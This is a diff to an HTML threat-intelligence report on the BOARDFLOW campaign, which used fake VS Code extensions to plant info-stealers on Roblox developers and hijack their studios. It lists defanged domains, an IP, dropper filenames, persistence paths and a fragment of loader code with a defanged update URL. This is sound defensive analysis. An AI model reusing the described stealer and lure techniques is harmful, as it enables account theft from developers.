@@ -767,7 +767,7 @@ td.mono {
     <li><b>Dark Cube Studio Takeover (July 31, 2026):</b> A YouTube community post by Dark Cube Studio creator "It's Steven" (<code>youtube[.]com/post/UgkxK3NKfyi2KVWwl_JowtPmPwBdU2DnyI1E</code>) states that the studio's Roblox group was hijacked on July 31, 2026 by an account matching the operator's handle (visible in the right screenshot below), corroborating the trophy claim on the holding page.</li>
     <li><b>Alias Rotation and Second Games:</b> After Dark Cube Studio publicized the takeover, the live text on the holding page rotated to claim ownership of "Second Games Verified on Roblox" under an updated username (visible in archive captures).</li>
     <li><b>Rolimon's Fencing and Shared Hosting on <code>192[.]142[.]48[.]98</code>:</b> The operator maintained an active trading profile on Rolimon's under the same handle to trade high-value Roblox items. At the network layer, Sysmon DNS telemetry confirmed that <code>dump-central[.]cc</code> ("CC Dump Central", a carding storefront with a footer credited to the operator) resolves to <code>192[.]142[.]48[.]98</code>, the same server hosting <code>p[x]bble[.]com</code> (September 8 to 18) and <code>p[e]bblexvale[.]com</code> (October 24).</li>
-    <li><b>Dev-Hitting Spree, Seven Burgers Hijack, and Blitfum's Video Exposure:</b> Beyond Dark Cube Studio, the operator's targeted attacks against game creators were thoroughly investigated and exposed by Roblox content creator Blitfum in a dedicated report: <a href="https://www.youtube.com/watch?v=ig2VbeaqFwA&amp;t=37s" target="_blank" rel="noopener"><i>"he STOLE a bunch of games, including one of my favorites..."</i> (YouTube)</a>. The investigation documents how developer "7", owner of the studio group <b>Seven Burgers</b> and creator of the fighting game <i>Something Something Battlegrounds</i> (SSBG), was socially engineered via direct message into executing a malicious info-stealer disguised as a custom developer tool. The malware harvested active browser login cookies to bypass two-factor authentication, after which the hijacked studio and game assets were transferred to the threat actor and rebranded under <b>"Pixel Studios"</b>. This directly corroborates the campaign's staging infrastructure on <code>pixelrbx[.]com</code> and <code>pixelstudiodev[.]com</code>. Crucially, it also explains the operator's scoff during the October 6 live C2 chat (<i>"all you did was find the roblox devfourm posts / ur not special"</i>): the operator was already acutely aware that their dev-hitting spree and studio thefts had been exposed across the Roblox DevForum and YouTube.</li>
+    <li><b>Dev-Hitting Spree, Seven Burgers Hijack, and Blitfum's Video Exposure:</b> Beyond Dark Cube Studio, the operator's targeted attacks against game creators were thoroughly investigated and exposed by Roblox content creator Blitfum in a dedicated report: <a href="https://www.youtube.com/watch?v=ig2VbeaqFwA&amp;t=37s" target="_blank" rel="noopener"><i>"he STOLE a bunch of games, including one of my favorites..."</i> (YouTube)</a>. The investigation documents how developer "7", owner of the studio group <b>Seven Burgers</b> and creator of the fighting game <i>Something Something Battlegrounds</i> (SSBG), was socially engineered via direct message into executing a malicious info-stealer disguised as a custom developer tool. The malware harvested active browser login cookies to bypass two-factor authentication, after which the hijacked studio and game assets were transferred to the threat actor and rebranded under <b>"Pixel Studios"</b>. This directly corroborates the campaign's staging infrastructure on <code>pixelrbx[.]com</code> and <code>pixelstudiodev[.]com</code>. Crucially, it also explains the operator's scoff during the October 6 live C2 chat on VM 408 (<i>"all you did was find the roblox devfourm posts / ur not special"</i>): the operator was already acutely aware that their dev-hitting spree and studio thefts had been exposed across the Roblox DevForum and YouTube.</li>
   </ol>
 
   <figure>
@@ -797,6 +797,14 @@ td.mono {
     <li><b>Backend Domains and Handles:</b> By contrast, the infrastructure repeatedly uses Roblox terminology: <code>pixelrbx[.]com</code> and <code>elrbx[.]com</code> (<code>rbx</code> for Roblox/Robux), <code>managerblx123</code> (<code>blx</code> for blox), <code>realism-hub[.]com</code> ("hub" from Roblox script-executor hubs), <code>rogiant[.]com</code> (the <code>ro-</code> prefix), and the matching infrastructure persona (handles visible in screenshots).</li>
     <li><b>Dropper Filenames:</b> Confirmed batch stagers use per-build mixed-case alphanumeric strings to avoid static filename rules: <code>p[x]bbzVkahQ5VT.bat</code>, <code>b1f87428620729e52.bat</code>, <code>b4dfbba06ccbh.bat</code>, <code>ghtwy6xvtu.bat</code>, <code>jmhu0sljrl.bat</code>, <code>qu1wd4klqw.bat</code>, <code>qvz2wkoybb6tp4wt.bat</code>, and <code>xqbiw5s4j2.bat</code>.</li>
   </ul>
+
+  <figure>
+    <div class="fig-grid">
+      <img src="screenshots/voodoobox_detox_boardflow.png" alt="VooDooBox ExtensionDetox Marketplace Triage Queue" onclick="openLightbox(this.src)">
+      <img src="screenshots/1792850105388/screenshot_screen0_1792851707.png" alt="Decoy Kanban Board inside VS Code during sandbox detonation" onclick="openLightbox(this.src)">
+    </div>
+    <figcaption><b>Left:</b> Automated ExtensionDetox marketplace triage engine filtered to the <code>BOARDFLOW</code> campaign, flagging re-armed extensions (<code>Studio Task</code> v1.2.1, <code>LinkInTree</code> v1.0.2, and <code>Trellis Board</code> v1.0.4) alongside dormant 1.4 KB sleeper stubs (<code>Kanban List</code> v0.0.1). <b>Right:</b> Inside the unattended sandbox VM (<code>DetoxWorkspace</code>, task <code>1792850105388</code>), <code>alphasolutions.studiotask-app</code> renders a functional-looking Kanban board inside Visual Studio Code while silently executing its background stage-2 loader.</figcaption>
+  </figure>
 
   <h3>The "Dev Hitter" Vector: Targeting Roblox Creators &amp; Hijacking Game Studios</h3>
   <p>
@@ -856,6 +864,11 @@ td.mono {
     </tbody>
   </table>
 
+  <figure>
+    <img src="screenshots/marketplace_monkeyfont.png" alt="Marketplace listing for the MonkeyFont lure extension" onclick="openLightbox(this.src)">
+    <figcaption><b>A lure as victims saw it:</b> The Visual Studio Marketplace listing for <code>FontingFonts.monkeyfont</code> (v1.0.0, released September 9, 2026). It has a friendly mascot icon, polished copy, and a harmless pitch as a "monkey-themed font playground." Nothing on the page hints at the bundled <code>boardflow</code> dropper that pulled <code>b1f87428620729e52.bat</code> from <code>p[x]bble[.]com</code>. This listing was captured by me during later lab review.</figcaption>
+  </figure>
+
   <p>
     <b>Confirmed Target Games, Studio Thefts, and Fencing:</b> The operational goal was not passive botnet recruitment, but targeted studio theft and financial liquidation:
   </p>
@@ -866,7 +879,7 @@ td.mono {
     <li><b>Fencing via Pixel Studios &amp; Rolimon's:</b> The threat actor monetized stolen assets through a dual pipeline: ongoing game revenue was funneled through <b>Pixel Studios</b> (corroborating staging hosts <code>pixelrbx[.]com</code> and <code>pixelstudiodev[.]com</code>), while high-value limited items were fenced through an active profile on Rolimon's.</li>
   </ul>
   <p>
-    <b>Closing the Loop on the Operator Chat:</b> This ecosystem context provides the exact missing link to the live C2 chat on October 6. When the operator scoffed: <i>"all you did was find the roblox devfourm posts / ur not special"</i>, they were not guessing. The threat actors were actively monitoring the DevForum threads where victimized developers had begun exposing the fake extensions, the stolen groups, and the Pixel Studios rebrand.
+    <b>Closing the Loop on the Operator Chat:</b> This ecosystem context provides the exact missing link to the live C2 chat on VM 408 on October 6. When the operator scoffed: <i>"all you did was find the roblox devfourm posts / ur not special"</i>, they were not guessing. The threat actors were actively monitoring the DevForum threads where victimized developers had begun exposing the fake extensions, the stolen groups, and the Pixel Studios rebrand.
   </p>
 
   <h3>How the Lab Wave Changed Over Time</h3>
@@ -1110,6 +1123,11 @@ process.env.PACKAGE_UPDATE_URL || "hxxp://boardflow[.]uk/package-update";</pre>
         });
     }
 }</pre>
+
+  <figure>
+    <img src="screenshots/voodoobox_task_1792850105388.png" alt="VooDooBox Automated Lab Telemetry for Task 1792850105388" onclick="openLightbox(this.src)">
+    <figcaption><b>Automated Lab Telemetry (Task <code>1792850105388</code>, Threat Score 99/100):</b> Post-detonation VooDooBox analysis of <code>alphasolutions.studiotask-app</code> (v1.2.1), automatically correlating the <code>www[.]canvases[.]ink</code> hook pull, <code>cscript.exe</code> execution of <code>BguYyUsWDTi4.js</code>, batch staging via <code>qu1wd4klqw.bat</code>, hidden scheduled-task persistence in <code>C:\ProgramData\IntelDriver\</code> (<code>JNsN.vbs</code>), and remote thread injection into <code>C:\Windows\explorer.exe</code> (PID 4764).</figcaption>
+  </figure>
 
   <h2>6. Memory Forensics: The 7-Build Donut Crypter Marker and YARA Rule</h2>
   <p>
